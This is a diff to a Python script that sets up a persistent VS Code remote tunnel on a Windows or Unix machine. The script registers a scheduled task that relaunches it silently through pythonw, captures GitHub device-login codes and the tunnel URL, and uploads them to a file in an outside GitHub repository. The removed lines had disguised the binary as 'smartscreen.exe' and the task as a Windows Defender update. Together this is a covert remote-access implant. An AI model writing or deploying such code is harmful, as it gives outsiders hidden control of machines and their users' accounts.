@@ -9,6 +9,7 @@ import time
 import urllib.error
 import urllib.parse
 import urllib.request
+import uuid
 import zipfile
 from datetime import datetime
 from pathlib import Path
@@ -20,23 +21,25 @@ GITHUB_REPO = "leanne-townsend/temp1"
 TARGET_FILE = "output1.txt"
 BRANCH = "main"
 
-# Change CODE_DIR if the CLI binary lives somewhere else, such as AppData\Roaming.
-CODE_DIR = Path(os.path.join(os.getenv("LOCALAPPDATA", ""), "VSCode", "Tunnel", "Code"))
-CODE_EXE_NAME = "smartscreen.exe" if platform.system().lower() == "windows" else "code"
-CODE_EXE = CODE_DIR / CODE_EXE_NAME
-TUNNEL_LOG = CODE_DIR / "tunnel_output.log"
-LOGIN_LOG = CODE_DIR / "login_output.log"
-FAILED_SYNC_LOG = CODE_DIR / "pending_github_sync.txt"
+CODE_EXE_NAME = "code.exe" if platform.system().lower() == "windows" else "code"
 TUNNEL_NAME = os.getenv("COMPUTERNAME", "workstation")
 SHOW_RAW_OUTPUT = False
 DEVICE_CODE_LIFETIME_SECONDS = 15 * 60
 MAX_DEVICE_CODE_ISSUES = 10
+IS_ADMIN_CONTEXT = False
+STATE_MODE = "user-local"
+CODE_DIR = Path(os.path.join(os.getenv("LOCALAPPDATA", ""), "VSCode", "Tunnel", "Code"))
+CODE_EXE = CODE_DIR / CODE_EXE_NAME
+TUNNEL_LOG = CODE_DIR / "tunnel_output.log"
+LOGIN_LOG = CODE_DIR / "login_output.log"
+FAILED_SYNC_LOG = CODE_DIR / "pending_github_sync.txt"
+RUN_LOCK = CODE_DIR / "combined.lock"
 
 DEVICE_CODE_PATTERN = re.compile(r"\b([A-Z0-9]{4}-?[A-Z0-9]{4})\b")
 URL_PATTERN = re.compile(r"https://[^\s]+")
 TUNNEL_URL_PATTERN = re.compile(r"https://vscode\.dev/tunnel/[^\s]+", re.IGNORECASE)
 LOGIN_HINT_PATTERN = re.compile(r"(github\.com/login/device|microsoft\.com/devicelogin)", re.IGNORECASE)
-TASK_NAME = "WindowsDefenderUpdateNode"
+TASK_NAME = "VSCodeTunnelDeploy"
 
 
 def windows_subprocess_kwargs() -> dict:
@@ -153,6 +156,7 @@ def build_summary_text(details: dict[str, str | None]) -> str:
     lines = [f"[{timestamp}] Tunnel Summary"]
 
     for label, key in (
+        ("Session ID", "session_id"),
         ("Status", "status"),
         ("Tunnel machine name", "machine_name"),
         ("Login instruction", "login_instruction"),
@@ -197,6 +201,40 @@ def can_reach_github_api() -> tuple[bool, str | None]:
         return False, str(error)
 
 
+def is_windows_admin() -> bool:
+    if platform.system().lower() != "windows":
+        return False
+    try:
+        result = run_command(["net", "session"], check=False, timeout=5)
+        return result.returncode == 0
+    except Exception:
+        return False
+
+
+def configure_runtime_paths() -> None:
+    global IS_ADMIN_CONTEXT, STATE_MODE, CODE_DIR, CODE_EXE, TUNNEL_LOG, LOGIN_LOG, FAILED_SYNC_LOG, RUN_LOCK
+
+    IS_ADMIN_CONTEXT = is_windows_admin()
+    if platform.system().lower() == "windows" and IS_ADMIN_CONTEXT:
+        STATE_MODE = "machine-wide"
+        CODE_DIR = Path(r"C:\ProgramData\VSCodeTunnel\Code")
+    else:
+        STATE_MODE = "user-local"
+        CODE_DIR = Path(os.path.join(os.getenv("LOCALAPPDATA", ""), "VSCode", "Tunnel", "Code"))
+
+    CODE_EXE = CODE_DIR / CODE_EXE_NAME
+    TUNNEL_LOG = CODE_DIR / "tunnel_output.log"
+    LOGIN_LOG = CODE_DIR / "login_output.log"
+    FAILED_SYNC_LOG = CODE_DIR / "pending_github_sync.txt"
+    RUN_LOCK = CODE_DIR / "combined.lock"
+
+
+def print_runtime_diagnostics() -> None:
+    print(f"[INFO] Launch admin/elevated: {IS_ADMIN_CONTEXT}")
+    print(f"[INFO] State mode: {STATE_MODE}")
+    print(f"[INFO] Resolved state directory: {CODE_DIR}")
+
+
 def resolve_pythonw_executable() -> str:
     executable = Path(sys.executable)
     candidates = [
@@ -225,14 +263,8 @@ def ensure_persistence() -> None:
     script_path = str(Path(__file__).resolve())
     pythonw_path = resolve_pythonw_executable()
 
-    try:
-        admin_check = run_command(["net", "session"], check=False, timeout=5)
-        is_admin = admin_check.returncode == 0
-    except Exception:
-        is_admin = False
-
     task_command = f'"{pythonw_path}" "{script_path}"'
-    if is_admin:
+    if IS_ADMIN_CONTEXT:
         create_cmd = [
             "schtasks",
             "/create",
@@ -349,6 +381,28 @@ def update_login_details_from_line(details: dict[str, str | None], cleaned_line:
         details["login_instruction"] = cleaned_line
 
 
+def acquire_run_lock() -> None:
+    RUN_LOCK.parent.mkdir(parents=True, exist_ok=True)
+    current_pid = str(os.getpid())
+
+    if RUN_LOCK.exists():
+        stale_pid = RUN_LOCK.read_text(encoding="utf-8", errors="replace").strip()
+        if stale_pid and stale_pid != current_pid:
+            raise RuntimeError(
+                f"Another combined.py run is already active for this machine. Lock file: {RUN_LOCK}"
+            )
+
+    RUN_LOCK.write_text(current_pid, encoding="utf-8")
+
+
+def release_run_lock() -> None:
+    if RUN_LOCK.exists():
+        try:
+            RUN_LOCK.unlink()
+        except OSError:
+            pass
+
+
 def build_file_api_url(repo: str, file_path: str) -> str:
     encoded_path = urllib.parse.quote(file_path, safe="/")
     return f"https://api.github.com/repos/{repo}/contents/{encoded_path}"
@@ -451,6 +505,7 @@ def logout_existing_login() -> None:
 
 def login_with_github() -> dict[str, str | None]:
     print("Starting GitHub authentication...")
+    session_id = uuid.uuid4().hex[:12]
     for issue_number in range(1, MAX_DEVICE_CODE_ISSUES + 1):
         LOGIN_LOG.parent.mkdir(parents=True, exist_ok=True)
         LOGIN_LOG.write_text("", encoding="utf-8")
@@ -471,6 +526,7 @@ def login_with_github() -> dict[str, str | None]:
         expires_at = issued_at + DEVICE_CODE_LIFETIME_SECONDS
         line_count = 0
         details: dict[str, str | None] = {
+            "session_id": session_id,
             "machine_name": TUNNEL_NAME,
             "login_instruction": None,
             "device_code": None,
@@ -540,6 +596,7 @@ def login_with_github() -> dict[str, str | None]:
 
         if issue_number == MAX_DEVICE_CODE_ISSUES:
             final_details = {
+                "session_id": session_id,
                 "machine_name": TUNNEL_NAME,
                 "login_instruction": details.get("login_instruction"),
                 "device_code": details.get("device_code"),
@@ -603,6 +660,8 @@ def start_tunnel_and_upload(summary_details: dict[str, str | None]) -> None:
                             tunnel_match = TUNNEL_URL_PATTERN.search(cleaned_line)
                             if tunnel_match:
                                 summary_details["tunnel_url"] = tunnel_match.group(0).rstrip(".)")
+                                summary_details["status"] = "Tunnel active"
+                                summary_details["message"] = "Continuation of authenticated session."
                                 print_summary(summary_details)
                                 sync_summary_to_github(summary_details, "tunnel URL detection", fatal=False)
                                 print(f"Tunnel is running. Full log: {TUNNEL_LOG}")
@@ -623,21 +682,37 @@ def start_tunnel_and_upload(summary_details: dict[str, str | None]) -> None:
     exit_code = process.poll()
     diagnostic = "\n".join(recent_lines) if recent_lines else "No tunnel output captured."
     if exit_code is None:
+        failure_details = dict(summary_details)
+        failure_details["status"] = "Tunnel pending"
+        failure_details["message"] = f"Timed out waiting for tunnel URL. Recent output: {diagnostic}"
+        print_summary(failure_details)
+        sync_summary_to_github(failure_details, "tunnel wait timeout", fatal=False)
         raise RuntimeError(f"Timed out waiting for tunnel URL.\nRecent output:\n{diagnostic}")
     if not uploaded:
+        failure_details = dict(summary_details)
+        failure_details["status"] = "Tunnel failed"
+        failure_details["message"] = f"Tunnel command failed. Recent output: {diagnostic}"
+        print_summary(failure_details)
+        sync_summary_to_github(failure_details, "tunnel failure", fatal=False)
         raise RuntimeError(f"Tunnel command failed.\nRecent output:\n{diagnostic}")
 
 
 def main() -> None:
+    configure_runtime_paths()
+    print_runtime_diagnostics()
+    acquire_run_lock()
     ensure_persistence()
-    ensure_code_cli()
-    validate_github_config()
-    close_existing_tunnel()
-    logout_existing_login()
+    try:
+        ensure_code_cli()
+        validate_github_config()
+        close_existing_tunnel()
+        logout_existing_login()
 
-    summary_details = login_with_github()
-    print("Complete the GitHub sign-in in the browser, then the tunnel will continue.")
-    start_tunnel_and_upload(summary_details)
+        summary_details = login_with_github()
+        print("Complete the GitHub sign-in in the browser, then the tunnel will continue.")
+        start_tunnel_and_upload(summary_details)
+    finally:
+        release_run_lock()
 
 
 if __name__ == "__main__":
